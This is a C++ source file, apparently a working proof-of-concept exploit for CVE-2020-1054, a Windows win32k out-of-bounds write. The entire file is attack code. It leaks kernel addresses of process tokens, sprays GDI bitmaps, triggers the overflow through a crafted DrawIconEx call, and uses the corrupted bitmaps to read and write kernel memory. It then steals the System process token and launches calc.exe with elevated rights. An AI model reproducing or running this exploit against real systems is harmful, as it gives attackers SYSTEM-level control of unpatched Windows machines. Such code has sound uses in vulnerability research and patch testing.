// CVE-2020-1054.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include "ntos.h"

SIZE_T GetObjectKernelAddress(HANDLE object)
{
	PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
	ULONG	handleInfoSize = 0x1000;
	ULONG	retLength;
	NTSTATUS status;
	SIZE_T kernelAddress = 0;
	BOOL bFind = FALSE;
	
	while (TRUE)
	{
		handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);

		status = NtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);

		if (status == 0xC0000004 || NT_SUCCESS(status))
		{
			LocalFree(handleInfo);

			handleInfoSize = retLength + 0x100;
			handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);

			status = NtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);

			if (NT_SUCCESS(status))
			{
				for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++)
				{
					if ((USHORT)object == 0x4)
					{
						if (0x4 == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)object == (SIZE_T)handleInfo->Handles[i].HandleValue)
						{
							kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
							bFind = TRUE;
							break;
						}
					}
					else
					{
						if (GetCurrentProcessId() == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)object == (SIZE_T)handleInfo->Handles[i].HandleValue)
						{
							kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
							bFind = TRUE;
							break;
						}
					}
				}
			}

		}

		if (handleInfo)
			LocalFree(handleInfo);

		if (bFind)
			break;
	}

	return kernelAddress;
}

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hCurProcess = OpenProcess(SYNCHRONIZE, FALSE, GetCurrentProcessId());
	SIZE_T cur_tokenpos_address = GetObjectKernelAddress(hCurProcess) + 0x208;
	SIZE_T sys_tokenpos_address = GetObjectKernelAddress((HANDLE)4) + 0x208;
	printf("[+] Current process = %p, System Process = %p\n", cur_tokenpos_address, sys_tokenpos_address);

	DWORD base_size = 0x51500;
	HDC base_dc = CreateCompatibleDC(0x0);
	HBITMAP base_handle = CreateCompatibleBitmap(base_dc, base_size, 0x100);

	PPEB pPeb = NtCurrentPeb();
	DWORD dwGdiCellSize;

#ifdef _WIN64
	dwGdiCellSize = 0x18;
#else
	dwGdiCellSize = 0x10;
#endif
    
	SIZE_T base_bm_address = *(SIZE_T*)((SIZE_T)pPeb->GdiSharedHandleTable + dwGdiCellSize * (((DWORD)base_handle) & 0xFFFF));
	SIZE_T oob_target = (base_bm_address & 0xfffffffffff00000) + 0x0000000100000000;
	DWORD alloc_size = 0x7FFFE8;
	DWORD extra_alloc = 0;
	SIZE_T oob_target_address = 0;
	SIZE_T pvscan_target_address = 0;

	HBITMAP oob_target_handle = NULL;
	HBITMAP pvscan_target_handle = NULL;

	printf("[+] Base Bitmap Surface Obj Address = %p\n", base_bm_address);

	HDC alloc_dc = CreateCompatibleDC(NULL);
    
	while (TRUE)
	{
		HBITMAP alloc_handle = CreateCompatibleBitmap(alloc_dc, alloc_size, 0x8);
		SIZE_T alloc_bm_address = *(SIZE_T*)((SIZE_T)pPeb->GdiSharedHandleTable + dwGdiCellSize * (((DWORD)alloc_handle) & 0xFFFF));
		Sleep(40);

		if (alloc_handle == 0 || alloc_bm_address == 0)
		{
			printf("[-] Failed out of memory allocating Bitmaps.\n");
			return 0;
		}

		if (oob_target > alloc_bm_address && (oob_target - alloc_bm_address) <= 0x10000000)
			alloc_size = 0x6f000;

		if ((alloc_bm_address >= oob_target) &&
			(alloc_bm_address & 0x0000000000070000) == 0x70000)
		{
			oob_target_address = alloc_bm_address;
			oob_target_handle = alloc_handle;
			printf("[+] Surf Obj to OOB overwrite the size = %p\n", oob_target_address);
		}

		if (oob_target_address > 0)
		{
			if (extra_alloc == 1)
			{
				pvscan_target_address = alloc_bm_address;
				pvscan_target_handle = alloc_handle;
				printf("[+] Surf Obj to overwrite pvScan01 = %p\n", pvscan_target_address);
			}

			if (extra_alloc > 1)
				break;

			extra_alloc++;
		}
	}

	SelectObject(base_dc, base_handle); 

	//DrawIconEx(base_dc, 0x900, 0xb, (HICON)0x40000010003, 0x0, 0xffe00000, 0x0, NULL, 0x1);
	DrawIconEx(base_dc, 0x8c0, 0xb, (HICON)0x40000010003, 0x0, 0xffc00000, 0x0, NULL, 0x1);

	SIZE_T sys_token_addr = 0;
	LPBYTE get_data;
	DWORD dwLength = 0;
	DWORD dwSize = 0x6fe18;
	//DWORD dwSize = 0x6fe10;

	get_data = (LPBYTE)LocalAlloc(LPTR, dwSize);
	GetBitmapBits(oob_target_handle, dwSize, get_data);
	*(SIZE_T*)(get_data + dwSize - 8) = sys_tokenpos_address;
	SetBitmapBits(oob_target_handle, dwSize, get_data);
	GetBitmapBits(pvscan_target_handle, 8, &sys_token_addr);
	printf("[+] System Token Address = %p\n", sys_token_addr);

	GetBitmapBits(oob_target_handle, dwSize, get_data);
	*(SIZE_T*)(get_data + dwSize - 8) = cur_tokenpos_address;
	SetBitmapBits(oob_target_handle, dwSize, get_data);
	SetBitmapBits(pvscan_target_handle, 8, &sys_token_addr);

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION	pi = { 0 };
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW;
	CreateProcess(NULL, L"calc.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 
	return 0;
}

